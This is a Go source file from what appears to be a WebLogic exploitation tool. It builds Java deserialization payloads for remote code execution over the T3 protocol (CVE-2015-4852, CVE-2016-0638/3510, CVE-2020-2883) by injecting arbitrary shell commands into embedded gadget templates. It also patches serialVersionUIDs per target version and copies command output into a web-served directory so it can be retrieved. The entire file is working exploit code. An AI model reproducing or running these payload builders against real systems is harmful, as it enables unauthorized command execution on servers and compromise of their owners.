package weblogic

import (
	"bytes"
	_ "embed"
	"encoding/binary"
	"fmt"
	"strings"
)

// Pre-compiled Java deserialization payload templates.
// Each template has a command string embedded at a known offset.
// We dynamically replace the command to support any shell command.

//go:embed payloads/java/CVE_2020_2883_template.bin
var template2883 []byte

//go:embed payloads/java/CVE_2015_4852_CC1_Cmd001
var templateCC1 []byte

// templateStreamMsg is the CommonsCollections6 gadget (HashSet → TiedMapEntry
// → LazyMap → ChainedTransformer; CC5 is unusable because JDK6's
// BadAttributeValueExpException has no readObject) wrapped in
// weblogic.jms.common.StreamMessageImpl (CVE-2016-0638 / CVE-2016-3510).
// The original argument of Runtime.exec(String) is "calc.exe".
//
//go:embed payloads/java/CVE_2016_0638_template.bin
var templateStreamMsg []byte

// templateInfo describes where the command string lives in a payload template
type templateInfo struct {
	cmdDataOffset int // offset where command bytes start (after TC_STRING + length)
	oldCmdLen     int // original command string length
	suffixOffset  int // offset right after the old command
}

var templates = map[string]templateInfo{
	"CVE_2020_2883": {cmdDataOffset: 0x375, oldCmdLen: 190, suffixOffset: 0x433},
	"CVE_2015_4852": {cmdDataOffset: 0x490, oldCmdLen: 56, suffixOffset: 0x4c8},
}

// buildFromTemplate injects cmd into a pre-compiled Java serialization payload.
// The template calls Runtime.getRuntime().exec(String[]{"/bin/sh","-c",cmd})
func buildFromTemplate(tpl []byte, info templateInfo, cmd string) []byte {
	cmdBytes := []byte(cmd)
	newLen := uint16(len(cmdBytes))

	result := make([]byte, 0, len(tpl))
	// Prefix: everything up to and including TC_STRING marker + 2-byte length
	result = append(result, tpl[:info.cmdDataOffset-2]...)
	// 2-byte big-endian new length
	result = append(result, byte(newLen>>8), byte(newLen))
	// New command
	result = append(result, cmdBytes...)
	// Suffix: everything after old command
	result = append(result, tpl[info.suffixOffset:]...)

	return result
}

// BuildRCEPayload builds a payload that executes cmd and writes output to consolehelp
func BuildRCEPayload(cmd string) []byte {
	consoleHelp := "/home/weblogic/Oracle/Middleware/Oracle_Home/wlserver/server/lib/consoleapp/consolehelp"
	fullCmd := fmt.Sprintf("%s > /tmp/rce_out.txt 2>&1; cp /tmp/rce_out.txt %s/rce_out.txt 2>/dev/null", cmd, consoleHelp)
	return buildFromTemplate(template2883, templates["CVE_2020_2883"], fullCmd)
}

// BuildRCEPayloadCC1 builds a CC1 variant payload
func BuildRCEPayloadCC1(cmd string) []byte {
	consoleHelp := "/home/weblogic/Oracle/Middleware/Oracle_Home/wlserver/server/lib/consoleapp/consolehelp"
	fullCmd := fmt.Sprintf("%s > /tmp/rce_out.txt 2>&1; cp /tmp/rce_out.txt %s/rce_out.txt 2>/dev/null", cmd, consoleHelp)
	return buildFromTemplate(templateCC1, templates["CVE_2015_4852"], fullCmd)
}

// coherenceStreamSUID13 are the serialVersionUID values of the Coherence
// classes referenced by the CVE-2020-2883 gadget in the Coherence shipped with
// WebLogic 12.2.1.3. They differ from 12.2.1.4/14.1.1.0 (which already match
// the pre-compiled template), so the stream must be patched per target version
// or the JVM throws InvalidClassException: local class incompatible.
var coherenceStreamSUID13 = map[string]int64{
	"com.tangosol.util.comparator.ExtractorComparator":       -339238653537079588,
	"com.tangosol.util.extractor.ChainedExtractor":           499354489611666612,
	"com.tangosol.util.extractor.AbstractCompositeExtractor": 606646246406950724,
	"com.tangosol.util.extractor.AbstractExtractor":          8440460029064511800,
	"com.tangosol.util.extractor.ReflectionExtractor":        -8676405058203276835,
}

// patchCoherenceSUID rewrites the class serialVersionUID fields of the
// serialized Coherence gadget so the stream matches the classes bundled with
// the target WebLogic version (as reported by the T3 HELO banner).
func patchCoherenceSUID(payload []byte, version string) []byte {
	if !strings.Contains(version, "12.2.1.3") && !strings.Contains(version, "12.1.3") {
		return payload
	}
	out := make([]byte, len(payload))
	copy(out, payload)
	for name, suid := range coherenceStreamSUID13 {
		i := bytes.Index(out, []byte(name))
		if i < 0 || i+len(name)+8 > len(out) {
			continue
		}
		binary.BigEndian.PutUint64(out[i+len(name):i+len(name)+8], uint64(suid))
	}
	return out
}

// buildStreamMsgPayload rewrites the Runtime.exec(String) argument of the
// StreamMessageImpl-wrapped CC6 gadget (HashSet.readObject → put →
// TiedMapEntry.hashCode → LazyMap.get, fires during readObject). The argument
// is stored as a TC_STRING inside the message body, so three length fields
// have to be fixed up: the TC_STRING length, the 4-byte payload length right
// before the inner aced0005 stream, and every enclosing TC_BLOCKDATALONG.
func buildStreamMsgPayload(script string) ([]byte, error) {
	const oldCmd = "calc.exe"
	marker := []byte("\x74\x00\x08" + oldCmd)
	i := bytes.Index(templateStreamMsg, marker)
	if i < 0 {
		return nil, fmt.Errorf("streammsg template: command string %q not found", oldCmd)
	}
	blocks := streamMsgBlocks(templateStreamMsg, i, len(marker))
	if len(blocks) == 0 {
		return nil, fmt.Errorf("streammsg template: enclosing TC_BLOCKDATALONG not found")
	}
	// The inner ObjectInputStream payload is length-prefixed: the 4 bytes
	// right before the second aced0005 magic hold its length.
	innerStart := bytes.Index(templateStreamMsg[1:], []byte("\xac\xed\x00\x05")) + 1
	if innerStart <= 0 {
		return nil, fmt.Errorf("streammsg template: inner stream not found")
	}
	lenField := innerStart - 4

	out := make([]byte, 0, len(templateStreamMsg)+len(script))
	out = append(out, templateStreamMsg[:i]...)
	out = append(out, 0x74, byte(len(script)>>8), byte(len(script)))
	out = append(out, script...)
	out = append(out, templateStreamMsg[i+len(marker):]...)
	delta := len(script) - len(oldCmd)
	for _, block := range blocks {
		blockLen := int(binary.BigEndian.Uint32(templateStreamMsg[block+1 : block+5]))
		binary.BigEndian.PutUint32(out[block+1:block+5], uint32(blockLen+delta))
	}
	innerLen := int(binary.BigEndian.Uint32(templateStreamMsg[lenField:innerStart]))
	binary.BigEndian.PutUint32(out[lenField:innerStart], uint32(innerLen+delta))
	return out, nil
}

// streamMsgBlocks finds every TC_BLOCKDATALONG header (0x7a + 4-byte length)
// enclosing the string at offset "at" with "n" bytes. A raw 0x7a byte can
// also appear inside block data, so a candidate is accepted only when the
// byte right after its declared end is TC_ENDBLOCKDATA (0x78).
func streamMsgBlocks(tpl []byte, at, n int) []int {
	var blocks []int
	for p := at - 1; p >= 0; p-- {
		if tpl[p] != 0x7a || p+5 > len(tpl) {
			continue
		}
		l := int(binary.BigEndian.Uint32(tpl[p+1 : p+5]))
		end := p + 5 + l
		if l > 0 && end < len(tpl) && end >= at+n && tpl[end] == 0x78 {
			blocks = append(blocks, p)
		}
	}
	return blocks
}

// BuildT3CmdPayload injects script into a pre-compiled T3 gadget template.
// Supported kinds: CVE_2015_4852 (CommonsCollections1) and CVE_2020_2883
// (Coherence ExtractorComparator). Both end in Runtime.exec(String), so the
// injected script must be written as "bash -c <no-space shell script>".
func BuildT3CmdPayload(kind, script string) ([]byte, error) {
	switch kind {
	case "CVE_2015_4852":
		return buildFromTemplate(templateCC1, templates["CVE_2015_4852"], script), nil
	case "CVE_2020_2883":
		return buildFromTemplate(template2883, templates["CVE_2020_2883"], script), nil
	case "CVE_2016_0638", "CVE_2016_3510":
		return buildStreamMsgPayload(script)
	default:
		return nil, fmt.Errorf("unsupported T3 gadget kind %q", kind)
	}
}
